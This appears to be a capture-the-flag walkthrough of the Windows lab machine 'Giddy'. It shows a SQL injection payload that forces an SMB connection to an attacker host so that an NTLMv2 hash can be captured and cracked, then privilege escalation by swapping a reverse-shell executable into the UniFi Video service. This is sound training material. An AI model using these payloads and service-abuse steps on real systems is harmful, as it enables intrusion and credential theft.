# Giddy - Walkthrough (Windows)

## 🎯 Initial Foothold

### 🔍 1. SQL Injection Discovery
- Found an MVC-style app on port 80.
- Inside the **search page**, discovered an **SQLi vulnerability**.

### ⚙️ 2. Exploiting SQLi via SMB Hash Capture
- Sent this payload in a Burp request:
  ```
  '+exec+xp_fileexist+'\\10.10.16.52\share\file--
  ```

- Meanwhile, on attacker machine:
  ```bash
  impacket-smbserver ninjafolder $(pwd) -smb2support
  ```

- Captured NTLMv2 hash for user **Stacy**.
- Cracked the hash using `john`.

### 🔑 3. Logging in via PowerShell Web Interface
- Used credentials with domain-style login:
  ```
  giddy\stacy
  ```

- Gained access to a PowerShell web console via the website.

---

## ⚙️ Privilege Escalation

### 🔍 1. Local Enumeration
- Found **Ubiquiti UniFi Video** app under:
  ```
  C:\ProgramData\unifi-video
  ```

### 🚨 2. Exploiting UniFi LPE Vulnerability
- Referenced exploit:  
  [Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation (EDB 43390)](https://www.exploit-db.com/exploits/43390)

- Used a crafted service executable for privilege escalation:
  - [prometheus.cpp from 0xdarkvortex](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp)

### 🛠️ 3. Service Abuse
- Uploaded malicious `.exe` reverse shell to the system.

- Started the service:
  ```powershell
  sc start "Ubiquiti UniFi Video"
  # or
  Start-Service "Ubiquiti UniFi Video"
  ```

- Confirmed status:
  ```powershell
  Get-Service "Ubiquiti UniFi Video"
  ```

- Caught reverse shell as **NT AUTHORITY\SYSTEM**

---

## 🧠 Notes
- Impacket SMB hash capture + SQLi is a deadly combo.
- PowerShell web consoles can be used like full shells.
- Service overwriting is a common and reliable LPE route.
